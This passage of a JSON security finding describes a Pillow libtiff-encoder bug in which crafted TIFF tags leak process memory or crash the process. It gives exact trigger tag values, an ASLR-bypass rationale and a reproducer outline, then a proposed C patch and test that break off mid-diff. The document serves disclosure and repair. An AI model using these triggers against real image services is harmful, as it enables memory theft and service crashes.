              "fullDescription": {
                "markdown": "```\n============================================================================\nMemory disclosure and segfault in libtiff encoder via crafted TIFF tags\nLocation: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, \"TIFF\")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.\n\nThe bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:\n\n- For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.\n- For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.\n\nWhere that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.\n\nOther branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` (\"Added custom int and float TIFF tags\") and first released in 5.4.0.\n\n## Details\n\n`PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument\nlist it hands to the variadic `TIFFSetField()` from the *Python* value of each\ntag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or\ncopied from the source file's IFD — and assumes that its own\n`ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the\n`va_list`. It does not: libtiff keeps its built-in definition for every tag it\nalready knows, and core tags are never registered at all. libtiff therefore\nconsumes the varargs as `(count, pointer)`, `(pointer)` or three pointers\naccording to *its* field table, whatever Pillow actually pushed. The encoder\nnever consults that table (`TIFFFindField` / `TIFFFieldPassCount` /\n`TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.\n\nThe most severe instance, and the one the attached reproducer exercises: when a\nTIFF is re-saved through the libtiff writer, every tag of the source IFD that\nPillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A\ncount-1 integer entry is passed as a single scalar vararg. If libtiff's own\nfield table defines that tag number as an *array* field, libtiff consumes the\nvarargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer\nbecomes either the number of bytes to copy from a never-written vararg slot, or\nthe source address itself. The same mismatch is reachable through the typed\ntuple branches (tuple length consumed as a pointer for fixed-count built-in\ntags such as `CFARepeatPatternDim`, even when the source file is well-formed),\nthe `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;\nthose are listed\nunder *Other branches with the same defect* below and need to be covered by the\nsame fix.\n\nA 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry\n`50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with\n`Image.open()` and saved with a bare `im.save(buf, \"TIFF\")` produces a 4296-byte\noutput whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning\n`/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.\nChanging the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same\ntwo calls segfault in `memcpy(dst, src=0x40, n=16)` under\n`ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the\nextensions reports `READ of size 4096` in `memcpy` called from\n`src/encode.c:1014` for the first input.\n\n### Code path\n\n`_save` copies all tags of the opened image into the libtiff attribute list.\nFor a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type\nis recorded, so the value goes through untyped:\n\n```python\n# src/PIL/TiffImagePlugin.py:1782\nsupplied_tags = {**legacy_ifd, **getattr(im, \"tag_v2\", {})}\n…\n# :1959-1982\nfor tag, value in itertools.chain(ifd.items(), supplied_tags.items()):\n    if tag not in TiffTags.LIBTIFF_CORE:\n        …\n        elif isinstance(value, (int, float, str, bytes)) or …:\n            type = TiffTags.lookup(tag).type      # None for 50740, 50829, …\n            if type:\n                types[tag] = type\n    if tag not in atts and tag not in blocklist:\n        …\n            atts[tag] = value                     # plain int 4096\n```\n\n`compression` defaults to the source image's `im.info[\"compression\"]`\n(`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff\nwriter without the application asking for it.\n\nIn the encoder the untyped `int` is autodetected as `TIFF_LONG`\n(`src/encode.c:805-815`), the tag is \"registered\" as a scalar custom field, and\nthen set with one 32-bit vararg:\n\n```c\n// src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)\nif (ImagingLibTiffMergeFieldInfo(\u0026encoder-\u003estate, type, key_int, is_var_length)) {\n    … continue;\n}\n…\n// src/encode.c:1013-1016\n} else if (type == TIFF_LONG || type == TIFF_IFD) {\n    status = ImagingLibTiffSetField(\n        \u0026encoder-\u003estate, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)\n    );\n```\n\nThe registration does not do what the caller assumes. `TIFFMergeFieldInfo()`\nonly adds definitions for tags libtiff does not already know and returns 0\n(success) either way, so for tags in libtiff's built-in table the built-in\ndefinition stays in force. Queried against the linked libtiff 4.5.0 after\nexactly Pillow's merge call:\n\n```\n50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)\n50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)\n65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)\n```\n\nlibtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`\naccording to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as\nthe element count — the attacker's 4096 — allocates `count * size` bytes and\n`memcpy`s that many bytes from `va_arg(ap, void *)`, a slot\n`PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register\n`rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the\ncopy succeeds deterministically (a value of 2 000 000 also succeeds and yields a\n2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the\noutput file as the tag's value. For fixed-count array fields (`passcount=0`,\n`writecount=4` for ActiveArea) there is no count argument, so the attacker's\nscalar is consumed as the `void *` source and 16 bytes are read from address\n64 → SIGSEGV.\n\nTags in libtiff 4.5's built-in table that Pillow forwards untyped and that take\nthe `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,\nCFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel\n50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data\n50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones\n(pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion\n50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,\nAsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,\nImageLayer 34732, RawDataUniqueID 50781.\n\nWhen the application saves with `tiffinfo=im.tag_v2` (the documented way to\npreserve metadata), the file-declared type is honoured, and a `LONG8` entry\nreaches the `(uint64_t)PyLong_AsLongLong(value)` branch at\n`src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full\n64-bit attacker-chosen address into the output: a source entry\n`50829 / LONG8 / 1 / \u003caddress of a Python bytes object\u003e` produced an output\nActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.\n\nThe comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes\nthat array tags with the wrong length \"will result in segfaults\"; the blocklist\ncovers only a handful of tags Pillow itself knows, not the ones libtiff knows and\nPillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`\n(\"Added custom int and float TIFF tags\", 2018-10-25), first released in 5.4.0;\nreleases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`\n(\"Partial fix for #1597\") limited `_save` to `LIBTIFF_CORE`.\n\n### Other branches with the same defect\n\nThe scalar-integer branch above is one of several places in the same loop\nwhere the call shape is derived from the Python value rather than from\nlibtiff's definition. All of the following were confirmed on this commit (stock\nbuild crashes and/or ASan reports, stack always `memcpy ← libtiff ←\nImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←\nPyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted\nfile followed by an ordinary `save()`:\n\n* **Typed tuple → `(len, av)` for a fixed-count built-in field**\n  (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE\n  tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff\n  built-in fields with `passcount=0` and a fixed `writecount` —\n  `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713\n  (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),\n  `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the\n  *first* vararg as the source pointer, so the tuple length becomes the\n  `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF\n  carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare\n  `im.save(out, \"TIFF\")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the\n  tuple length) on every run; so does\n  `Image.new(\"L\", (8, 8)).save(buf, \"TIFF\", compression=\"packbits\",\n  tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with\n  `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in\n  fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way\n  through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.\n  The mirror image for `passcount=1` fields: `Photoshop` 34377 declared\n  SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff\n  reads 60000 as the count and an unpassed vararg as the pointer, and the\n  re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes\n  of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).\n* **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects\n  `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).\n  `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`\n  and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the\n  file's declared type selects this branch.\n  - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette\n    PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value\n    skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads\n    three `uint16_t *` and copies `1 \u003c\u003c BitsPerSample` shorts from each — a\n    512-byte over-read of the 5-byte Python bytes buffer, then dereference of\n    two stale argument registers → SIGSEGV on every run of\n    `Image.open(f); im.save(out, \"TIFF\")`. `COLORMAP` is not in `_save`'s\n    `blocklist`.\n  - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type\n    (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED\n    type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do\n    not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of\n    the `char *` become the byte count for a `memcpy` from a stale register\n    (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,\n    otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the\n    same way via `im.info[\"icc_profile\"]` → `ifd[ICCPROFILE]`\n    (`TiffImagePlugin.py:1822-1824`).\n* **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;\n  compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).\n  - For a private tag (e.g. 50000) Pillow itself registers the field with\n    `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of\n    `av` as the element count and the next stale vararg as the source:\n    `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under\n    ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by\n    a JPEG whose EXIF carries one private RATIONAL×2 tag saved with\n    `im.save(out, \"TIFF\", compression=\"tiff_lzw\", exif=im.info[\"exif\"])`, or a\n    TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of\n    `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =\n    ifd.tagtype[tag]` at `:1968`).\n  - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),\n    `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which\n    `_save` forwards from any source TIFF and types RATIONAL via\n    `TiffTags.lookup`, the pointer-only convention happens to match, but\n    libtiff copies its *fixed* count from an array that is only as long as the\n    file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a\n    bare `im.save(out, \"TIFF\")` gives `READ of size 24 … right of 4-byte\n    region`, and the over-read floats are written to tag 319 of the output.\n    `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at\n    `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.\n* **Core tag reached as a scalar via a stale file-supplied type.** With the\n  re-save idiom `im.save(out, \"TIFF\", tiffinfo=im.tag_v2)`, `_save` copies\n  `ifd.tagtype[key] = info.tagtype[key]` for every key\n  (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of\n  the same tags without resetting the type (`ifd[COLORMAP] = colormap` at\n  `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,\n  ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry\n  is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry\n  palette to a single `int` (with only a \"too many entries\" warning), the\n  encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and\n  `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —\n  libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every\n  run. The stale-tagtype copy is a Python-side hygiene bug in its own right,\n  but its memory-safety consequence exists only because the encoder lets a\n  non-tuple value reach `TIFFSetField(COLORMAP)`.\n\n## Impact\n\nAny service that accepts a TIFF and writes it back out as TIFF through libtiff —\nwhich happens with a plain `im.save(fp, \"TIFF\")` whenever the uploaded file is\ncompressed, or whenever a `compression=` other than raw is requested — returns\nto the uploader, inside one metadata tag of the produced file, an\nattacker-chosen number of bytes read from a stale pointer in the worker process,\ndeterministically and without retries. Which memory that is depends on the\ncompiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang\nbuild the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes\n(which succeeded every time in testing, as did 2 000 000) covers the\nextension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+\nresolved pointers into libpython, libc, libtiff, libjpeg and others — a complete\nASLR bypass for chaining with any other memory bug; a gcc build of the same\nsource left a different, unrelated address in that slot. The fixed-count\nvariant kills the worker process with SIGSEGV from a 181-byte upload on every\nrequest. With `tiffinfo=im.tag_v2` the source\naddress is fully attacker-chosen (16-byte arbitrary read into the output for\nActiveArea, or a crash). No non-default Pillow setting is involved; the only\nprecondition is TIFF-to-TIFF re-encoding.\n\nThe other branches add further deterministic process-kill inputs (BYTE-typed\nColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so\nopen→thumbnail→save-as-TIFF is affected too) and extend the reach to\nJPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to\nlibtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its\ndestination buffers with the same count it copies, so no out-of-bounds write\nwas found.\n\n## Reproducing\n\n`repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.\n\n`upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `\u003ctag\u003e / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, \"TIFF\")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole \"application\": `Image.open(BytesIO(src)); im.save(out, \"TIFF\")`.\n\nThe script runs three cases:\n\n1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.\n2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.\n3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.\n\nExpected output on the affected tree:\n\n```\ncontrol  tag 65000=4096 -\u003e 4096\nleak     tag 50740=65536 from a 356-byte upload -\u003e 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff\n         leaked bytes found in _imaging.so at file offset 0x57588\ncrash    tag 50829=64 -\u003e child exit -11 (SIGSEGV)\nBUG\n```\n\nThe script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).\n\nThe other branches can be checked by hand on the stock build in the same way\n(each as `Image.open(f); im.save(BytesIO(), \"TIFF\")` in a child process):\na PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / \"ABCD\"` →\nSIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`\nsaved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG\nwhose EXIF holds tag 50000 = RATIONAL×2 saved with\n`compression=\"tiff_lzw\", exif=im.info[\"exif\"]` → SIGSEGV in most runs,\n`RuntimeError` (\"Failed to allocate memory for custom tag binary object\n(-N elements of 4 bytes each)\") in the rest.\n\n## Suggested fix\n\nThe encoder must not guess the calling convention; it has to ask libtiff what\nthe tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and\nmarshal accordingly, or refuse. The attached patch does this for non-core tags:\n\n* a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared\n  in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's\n  `TIFFFindField` type, `passcount` and `writecount` for a tag;\n* in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that\n  libtiff already knows, Pillow adopts libtiff's type when it has none of its\n  own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`\n  checks the value against libtiff's definition: a scalar only for a\n  single-value field whose C argument type (int / `uint64_t` / double /\n  `char *`) matches, an array only with libtiff's element size and, for\n  fixed-count fields, exactly `writecount` elements. Anything else raises\n  `ValueError(\"Tag value does not match libtiff field definition\")` instead of\n  reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and\n  ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the\n  `LONG8` `tiffinfo=` variant;\n* every tuple/`bytes` branch now goes through `set_tiff_array_field()`, which\n  passes `len` only when the field has `passcount` set; this also fixes the\n  `TIFF_RATIONAL` branch, which never passed a count (and extends it to\n  `TIFF_SRATIONAL`);\n* `TIFF_UNDEFINED` fields are registered as variable-length, matching how their\n  `bytes` values are passed;\n* `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,\n  scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).\n\nCore tags and tags libtiff does not know keep their current behaviour. With the\npatch applied to a clean checkout and rebuilt, the reproducer no longer\ntriggers and the test suite passes. It is not a complete fix, however: the\nwhole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant\nstays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a\nbare `save()`, no longer segfaults at this point but writes 1536 bytes —\nover-read from the 5-byte `bytes` object and two stale varargs, including 22\nlive heap pointers — into the output ColorMap, which is still a disclosure.\nBefore merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through\nthe existing 768-tuple branch, never through the scalar or `bytes` branches,\nand ideally the same shape check for the other core tags libtiff special-cases\nin `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,\nReferenceBlackWhite 532).\n\nNarrower Python-side mitigations in `_save` close individual entry points but\nnot the class, and are worth adding alongside the C-side check: drop tags\nwith `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not\n`tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to\n`EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type\nguard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to\n`REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before\nassigning its own ColorMap/BitsPerSample/ICCProfile/… values so a\n`tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to\nrely on.\n\n## The patch\n\nPass TIFF tag values to libtiff according to its own field definition, and raise ValueError when they do not fit\n\nApplies to `src/encode.c` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..adc4633e4 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -395,6 +395,43 @@ class TestFileLibTiff(LibTiffTestCase):\n         with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n             im.save(out, tiffinfo=ifd)\n \n+    @pytest.mark.parametrize(\n+        \"tag, value\",\n+        (\n+            # DNGPrivateData is a BYTE array with a count to libtiff\n+            (50740, 4096),\n+            # ActiveArea is a LONG array of four values to libtiff\n+            (50829, 64),\n+            (50829, (0, 0)),\n+        ),\n+    )\n+    def test_libtiff_field_definition(\n+        self, tag: int, value: Any, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n+    ) -\u003e None:\n+        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n+\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[tag] = value\n+        ifd.tagtype[tag] = TiffTags.LONG\n+\n+        out = tmp_path / \"temp.tif\"\n+        im = Image.new(\"L\", (1, 1))\n+        with pytest.raises(ValueError, match=\"libtiff field definition\"):\n+            im.save(out, tiffinfo=ifd)\n+\n+        # Values that match the libtiff definition are written\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[50740] = b\"private\"\n+        ifd.tagtype[50740] = TiffTags.BYTE\n+        ifd[50829] = (0, 0, 1, 1)\n+        ifd.tagtype[50829] = TiffTags.LONG\n+        im.save(out, tiffinfo=ifd)\n+\n+        with Image.open(out) as reloaded:\n+            assert isinstance(reloaded, TiffImagePlugin.TiffImageFile)\n+            assert reloaded.tag_v2[50740] == b\"private\"\n+            assert reloaded.tag_v2[50829] == (0, 0, 1, 1)\n+\n     def test_inknames_tag(\n         self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n     ) -\u003e None:\ndiff --git a/src/encode.c b/src/encode.c\nindex 9e19e9002..cbbd09f0d 100644\n--- a/src/encode.c\n+++ b/src/encode.c\n@@ -675,6 +675,106 @@ PyImaging_ZipEncoderNew(PyObject *self, PyObject *args) {\n \n #include \u003cstring.h\u003e\n \n+/* C type that TIFFSetField reads from its arguments for a single value of\n+   the given type: int, uint64_t, double or char * */\n+static int\n+tiff_scalar_arg_type(TIFFDataType type) {\n+    switch (type) {\n+        case TIFF_BYTE:\n+        case TIFF_SBYTE:\n+        case TIFF_UNDEFINED:\n+        case TIFF_SHORT:\n+        case TIFF_SSHORT:\n+        case TIFF_LONG:\n+        case TIFF_SLONG:\n+        case TIFF_IFD:\n+            return 1;\n+        case TIFF_LONG8:\n+        case TIFF_SLONG8:\n+        case TIFF_IFD8:\n+            return 2;\n+        case TIFF_FLOAT:\n+        case TIFF_DOUBLE:\n+        case TIFF_RATIONAL:\n+        case TIFF_SRATIONAL:\n+            return 3;\n+        case TIFF_ASCII:\n+            return 4;\n+        default:\n+            return 0;\n+    }\n+}\n+\n+/* Size of the values that TIFFSetField copies from an array of the given\n+   type. libtiff stores custom RATIONAL arrays as floats. */\n+static int\n+tiff_array_item_size(TIFFDataType type) {\n+    switch (type) {\n+        case TIFF_BYTE:\n+        case TIFF_SBYTE:\n+        case TIFF_UNDEFINED:\n+        case TIFF_ASCII:\n+            return 1;\n+        case TIFF_SHORT:\n+        case TIFF_SSHORT:\n+            return 2;\n+        case TIFF_LONG:\n+        case TIFF_SLONG:\n+        case TIFF_IFD:\n+        case TIFF_FLOAT:\n+        case TIFF_RATIONAL:\n+        case TIFF_SRATIONAL:\n+            return 4;\n+        case TIFF_DOUBLE:\n+        case TIFF_LONG8:\n+        case TIFF_SLONG8:\n+        case TIFF_IFD8:\n+            return 8;\n+        default:\n+            return 0;\n+    }\n+}\n+\n+/* Check that a value which will be passed to TIFFSetField as a single value\n+   of the given type, or as an array of len values, matches the definition\n+   of the field that libtiff will use. */\n+static int\n+tiff_field_matches(\n+    TIFFDataType field_type,\n+    int passcount,\n+    int writecount,\n+    TIFFDataType type,\n+    int is_var_length,\n+    Py_ssize_t len\n+) {\n+    if (field_type == TIFF_ASCII \u0026\u0026 !passcount) {\n+        // TIFFSetField reads a null-terminated string\n+        return !is_var_length \u0026\u0026 type == TIFF_ASCII;\n+    }\n+    if (!is_var_length) {\n+        // TIFFSetField reads a single value\n+        return !passcount \u0026\u0026 writecount == 1 \u0026\u0026 tiff_scalar_arg_type(type) \u0026\u0026\n+               tiff_scalar_arg_type(type) == tiff_scalar_arg_type(field_type);\n+    }\n+    // TIFFSetField reads a pointer to the values, preceded by the number of\n+    // values if passcount is set. Otherwise, the number of values is fixed.\n+    if (!tiff_array_item_size(type) ||\n+        tiff_array_item_size(type) != tiff_array_item_size(field_type)) {\n+        return 0;\n+    }\n+    return passcount || (writecount \u003e 1 \u0026\u0026 len == writecount);\n+}\n+\n+static int\n+set_tiff_array_field(\n+    ImagingCodecState state, int key, int passcount, Py_ssize_t len, void *av\n+) {\n+    if (passcount) {\n+        return ImagingLibTiffSetField(state, (ttag_t)key, len, av);\n+    }\n+    return ImagingLibTiffSetField(state, (ttag_t)key, av);\n+}\n+\n PyObject *\n PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n     ImagingEncoderObject *encoder;\n@@ -689,7 +789,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n     PyObject *key, *value;\n     Py_ssize_t pos = 0;\n     int key_int, status, is_core_tag, is_var_length, num_core_tags, i;\n-    TIFFDataType type = TIFF_NOTYPE;\n+    int is_known_tag, passcount, writecount;\n+    TIFFDataType type = TIFF_NOTYPE, field_type;\n     // This list also exists in TiffTags.py\n     const int core_tags[] = {256, 257, 258,   259,   262,   263,   266,  269, 274, 277,\n                              278, 280, 281,   282,   283,   284,   286,  287, 296, 297,\n@@ -777,6 +878,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n         status = 0;\n         is_core_tag = 0;\n         is_var_length = 0;\n+        is_known_tag = 0;\n+        passcount = 1;\n         type = TIFF_NOTYPE;\n \n         for (i = 0; i \u003c num_core_tags; i++) {\n@@ -800,6 +903,15 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 }\n                 Py_DECREF(tag_type);\n             }\n+\n+            // libtiff uses its own definition for tags that it already knows,\n+            // rather than the field registered below.\n+            is_known_tag = ImagingLibTiffFindField(\n+                \u0026encoder-\u003estate, key_int, \u0026field_type, \u0026passcount, \u0026writecount\n+            );\n+            if (is_known_tag \u0026\u0026 type == TIFF_NOTYPE) {\n+                type = field_type;\n+            }\n         }\n \n         if (type == TIFF_NOTYPE) {\n@@ -838,7 +950,7 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n \n         if (!is_core_tag) {\n             // Register field for non core tags.\n-            if (type == TIFF_BYTE) {\n+            if (type == TIFF_BYTE || type == TIFF_UNDEFINED) {\n                 is_var_length = 1;\n             }\n             if (ImagingLibTiffMergeFieldInfo(\n@@ -847,6 +959,28 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 Py_DECREF(item);\n                 continue;\n             }\n+\n+            if (is_known_tag) {\n+                // Check that the value will be passed to TIFFSetField in the\n+                // form that libtiff's definition of the tag expects.\n+                Py_ssize_t len = 0;\n+                if (PyTuple_Check(value)) {\n+                    len = PyTuple_Size(value);\n+                } else if (PyBytes_Check(value)) {\n+                    len = PyBytes_Size(value);\n+                }\n+                if (!tiff_field_matches(\n+                        field_type, passcount, writecount, type, is_var_length, len\n+                    )) {\n+                    Py_DECREF(encoder);\n+                    